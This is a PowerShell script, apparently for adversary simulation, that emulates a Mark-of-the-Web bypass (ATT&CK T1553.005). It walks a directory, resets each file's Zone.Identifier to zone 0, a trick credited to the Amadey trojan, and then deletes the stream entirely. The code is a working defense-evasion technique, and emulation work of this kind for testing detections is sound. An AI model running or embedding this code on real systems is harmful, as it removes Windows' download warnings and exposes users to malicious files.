<#
    T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass
    T1562.001 - Impair Defenses: Disable or Modify Tools
    - Set Zone.Identifier to 0 for each file in the given directory
    - Remove Zone.Identifer completly for each file in the given directory
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

param ( 
    [Parameter(Mandatory=$false)]
    [string]$Path = (Get-Location)
)

$files = Get-ChildItem -Path $Path 
foreach ($file in $files){
    $motw = $false
    $streams = Get-Item -Force -Stream * $file | Select-Object Stream
    foreach ($s in $streams) {
        if ($s.Stream -eq "Zone.Identifier") {
            $motw = $true
            Write-Host "MOTW found $s in $file, removing..."
            # simulate setting Zone.Identifier to 0, technique used by Amadey trojan bot
            (Get-Content $file -Stream Zone.identifier) -replace 'ZoneId=([^0]+)','ZoneId=0' | Set-Content $file -Stream Zone.identifier
            # Remove completly the Zone.Identifier
            Remove-Item -Force -Stream Zone.Identifier $file
            if($? -eq $true){
                Write-Host -ForegroundColor Green "MOTW $s removed from $file"
            }
            else{
                Write-Host -ForegroundColor Red "Error: Cannot remove MOTW $s from $file"
            }
        }
    }
    if ($motw -eq $false){
        Write-Host -ForegroundColor Gray "MOTW not found for $file"
    }

}

Stop-Transcript
